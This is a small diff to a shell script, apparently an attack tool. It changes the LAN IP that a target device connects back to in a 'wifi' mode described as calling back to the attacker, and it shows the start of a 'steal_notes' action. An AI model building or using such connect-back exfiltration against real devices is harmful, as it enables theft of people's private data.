@@ -75,7 +75,7 @@ if [ "$CONNECT_MODE" = "wifi" ]; then
     # WiFi 模式：设备主动回连攻击者，不依赖 adb
     # 使用 PC 在局域网上的真实 IP（不是 WSL2 虚拟 IP）
     RECV_PORT=25001
-    PC_IP="192.168.255.63"  # 改为你 PC 的局域网 IP
+    PC_IP="192.168.169.63"  # 改为你 PC 的局域网 IP
     
     case "$ACTION" in
         steal_notes)
